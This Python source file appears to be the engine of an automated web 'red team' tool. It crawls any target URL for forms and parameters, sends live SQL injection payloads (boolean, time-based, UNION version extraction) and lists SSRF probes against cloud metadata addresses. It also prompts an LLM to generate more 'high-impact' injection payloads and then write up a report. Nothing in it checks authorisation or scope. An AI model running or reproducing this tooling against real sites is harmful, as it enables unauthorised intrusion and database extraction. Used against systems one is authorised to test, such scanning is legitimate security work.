import os
import json
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from openai import OpenAI

# ---------- CONFIG ----------
# Read API key from environment (set this in Render or locally)
GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "your-groq-key"
SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "your-serper-key"  # optional

_cache = {}
client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)

# ---------- 1. DISCOVER INJECTION POINTS (crawls forms + URL params) ----------
def discover_injection_points(target_url: str) -> list:
    """
    Crawls the target HTML to find forms and URL parameters.
    Returns a list of injection points: [{"method": "GET/POST", "url": "...", "data": {...}, "param": "..."}]
    """
    points = []
    try:
        resp = requests.get(target_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")

        # Find forms
        for form in soup.find_all("form"):
            method = form.get("method", "get").upper()
            action = form.get("action", "")
            if action.startswith("http"):
                url = action
            else:
                url = target_url.rstrip("/") + "/" + action.lstrip("/")
            inputs = form.find_all("input")
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if name:
                    data[name] = ""
            if data:
                points.append({
                    "method": method,
                    "url": url,
                    "data": data,
                    "param": None
                })

        # Query parameters in the target URL
        parsed = urlparse(target_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key in query_params.keys():
                points.append({
                    "method": "GET",
                    "url": target_url,
                    "data": None,
                    "param": key
                })

        # If nothing found, fallback to common endpoints
        if not points:
            common_endpoints = ["/login", "/admin", "/search", "/api"]
            for ep in common_endpoints:
                points.append({
                    "method": "POST",
                    "url": target_url.rstrip("/") + ep,
                    "data": {"username": "", "password": ""},
                    "param": None
                })
    except Exception as e:
        print(f"[Discovery Error]: {e}")
        # Ultimate fallback
        points.append({
            "method": "POST",
            "url": target_url,
            "data": {"username": "", "password": ""},
            "param": None
        })
    return points

# ---------- 2. SEND PAYLOAD (REAL HTTP REQUEST) ----------
def send_payload(injection_point: dict, payload: str) -> dict:
    """
    Sends a real HTTP request with the injected payload.
    Returns: {"status_code": int, "response_text": str, "time": float, "error": None or str}
    """
    method = injection_point.get("method", "GET")
    url = injection_point["url"]
    data = injection_point.get("data")
    param = injection_point.get("param")

    try:
        if method == "GET" and param:
            # Inject into query parameter
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param] = payload
            new_query = urlencode(query_dict, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            start = time.time()
            resp = requests.get(new_url, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "response_text": resp.text[:2000],
                "time": elapsed,
                "error": None
            }
        elif method == "POST" and data:
            # Inject into POST data (first field)
            post_data = data.copy()
            for key in post_data.keys():
                post_data[key] = payload
                break
            start = time.time()
            resp = requests.post(url, data=post_data, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "response_text": resp.text[:2000],
                "time": elapsed,
                "error": None
            }
        else:
            # Generic GET fallback
            start = time.time()
            resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "response_text": resp.text[:2000],
                "time": elapsed,
                "error": None
            }
    except Exception as e:
        return {
            "status_code": 0,
            "response_text": "",
            "time": 0,
            "error": str(e)
        }

# ---------- 3. AI GENERATES PAYLOADS ----------
def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 8) -> list:
    cache_key = f"payloads_{target_url}_{vuln_type}"
    if cache_key in _cache:
        return _cache[cache_key]

    prompt = f"""Generate {num_payloads} high‑impact SQL injection payloads for {target_url}. Include:
- Error‑based (e.g., ' OR 1=1 --)
- Boolean‑based (e.g., ' AND 1=1 -- and ' AND 1=2 --)
- Time‑based (e.g., ' AND SLEEP(5) --)
- UNION‑based (e.g., ' UNION SELECT null,null --)
- Obfuscated (encoding, comments)
Return ONLY a JSON array of strings. No explanation."""
    try:
        response = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a security expert. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            payloads = json.loads(raw[start:end])
        else:
            payloads = [raw]
        _cache[cache_key] = payloads
        return payloads
    except Exception as e:
        print(f"[AI Payload Generation Error]: {e}")
        return get_fallback_payloads(vuln_type)

# ---------- 4. FALLBACK PAYLOADS ----------
def get_fallback_payloads(vuln_type: str) -> list:
    fallbacks = {
        "SQL Injection": [
            "' OR '1'='1' --",
            "' AND '1'='1' --",
            "' AND '1'='2' --",
            "' AND SLEEP(5) --",
            "' UNION SELECT null,null,null --",
            "' OR 1=1 --",
            "admin' --",
            "' OR 'x'='x' --"
        ],
        "Broken Access Control": ["/admin", "/dashboard?user=admin", "JWT tampered"],
        "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080"]
    }
    return fallbacks.get(vuln_type, ["test"])

# ---------- 5. REAL EXPLOIT ENGINE (SQLi) ----------
def exploit_sqli(injection_point: dict) -> dict:
    """
    Performs real SQL injection exploitation with:
    - Error‑based detection
    - Boolean‑based blind
    - Time‑based blind
    - UNION‑based data extraction
    Returns: {"vulnerable": bool, "technique": str, "extracted": str, "evidence": dict}
    """
    base_payloads = [
        ("' OR '1'='1' --", "error_based"),
        ("' AND '1'='1' --", "boolean_true"),
        ("' AND '1'='2' --", "boolean_false"),
        ("' AND SLEEP(5) --", "time_based"),
        ("' UNION SELECT null,null,null --", "union")
    ]
    results = {}
    for payload, technique in base_payloads:
        resp = send_payload(injection_point, payload)
        if resp["error"]:
            continue
        status = resp["status_code"]
        text = resp["response_text"].lower()
        elapsed = resp["time"]

        # Error‑based detection
        if technique == "error_based" and (status == 500 or "sql" in text or "error" in text or "exception" in text):
            return {
                "vulnerable": True,
                "technique": "error_based",
                "extracted": None,
                "evidence": {"status": status, "snippet": text[:200]}
            }
        # Boolean‑based blind – store responses for later comparison
        if technique == "boolean_true":
            results["boolean_true"] = {"status": status, "text": text, "time": elapsed}
        if technique == "boolean_false":
            results["boolean_false"] = {"status": status, "text": text, "time": elapsed}
        # Time‑based blind
        if technique == "time_based" and elapsed > 4:
            return {
                "vulnerable": True,
                "technique": "time_based",
                "extracted": None,
                "evidence": {"sleep": elapsed}
            }
        # UNION – try to extract database version
        if technique == "union":
            # If the response differs from error responses, try to extract version
            version_payload = "' UNION SELECT @@version,null,null --"
            resp2 = send_payload(injection_point, version_payload)
            if resp2["error"] is None and resp2["status_code"] == 200:
                if "mysql" in resp2["response_text"].lower() or "mariadb" in resp2["response_text"].lower() or "postgresql" in resp2["response_text"].lower():
                    return {
                        "vulnerable": True,
                        "technique": "union_extract",
                        "extracted": resp2["response_text"][:500],
                        "evidence": {"version": resp2["response_text"][:200]}
                    }

    # Boolean blind comparison
    if "boolean_true" in results and "boolean_false" in results:
        if results["boolean_true"]["status"] != results["boolean_false"]["status"] or \
           results["boolean_true"]["text"] != results["boolean_false"]["text"]:
            return {
                "vulnerable": True,
                "technique": "boolean_blind",
                "extracted": None,
                "evidence": {
                    "true_response": results["boolean_true"]["text"][:100],
                    "false_response": results["boolean_false"]["text"][:100]
                }
            }

    return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}

# ---------- 6. MAIN ORCHESTRATOR (Real Exploit) ----------
def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
    """
    Main entry point – actually sends exploit payloads and confirms real vulnerabilities.
    Returns a red team report or a clean "no vulnerability" message.
    """
    # 1. Discover injection points
    injection_points = discover_injection_points(target_url)
    if not injection_points:
        return "❌ No injection points discovered. Target may not be vulnerable or may be unreachable."

    all_exploits = []
    any_success = False

    # 2. For each injection point, run the exploit engine
    for point in injection_points:
        if vuln_type == "SQL Injection":
            print(f"[*] Testing SQL Injection on {point['url']}...")  # Log for debugging
            result = exploit_sqli(point)
            if result["vulnerable"]:
                any_success = True
                all_exploits.append({
                    "point": point,
                    "vulnerability": "SQL Injection",
                    "technique": result["technique"],
                    "extracted": result.get("extracted"),
                    "evidence": result["evidence"]
                })
        # Add other vuln types (BAC, SSRF) here later

    # 3. Generate report based on real results
    if any_success:
        # Real vulnerability found – generate detailed report
        prompt = f"""Write a detailed red team report.

Vulnerability: {vuln_type}
Target: {target_url}

Successful Exploits:
{json.dumps(all_exploits, indent=2)}

Include:
1. Executive summary
2. Attack vector explanation
3. Successful payloads (with evidence)
4. Impact assessment
5. Remediation steps
"""
        try:
            response = client.chat.completions.create(
                model="llama-3.1-8b-instant",
                messages=[
                    {"role": "system", "content": "You are a senior security consultant. Write professional red team reports."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3
            )
            report = response.choices[0].message.content.strip()
        except Exception as e:
            report = f"✅ Exploit successful but report generation failed: {e}"
    else:
        # No vulnerability found – honest response
        report = f"""❌ No vulnerabilities found for {vuln_type} on {target_url}.

Injection points tested: {len(injection_points)}
Status: The target appears secure against this attack vector.

Recommendation: Consider manual testing for more complex vulnerabilities."""

    # Store result for status check (used by main.py)
    global _last_exploit_success
    _last_exploit_success = any_success
    return report

# ---------- GLOBAL STATUS ----------
_last_exploit_success = False

def get_last_exploit_success():
    """Returns whether the last exploitation attempt succeeded."""
    return _last_exploit_success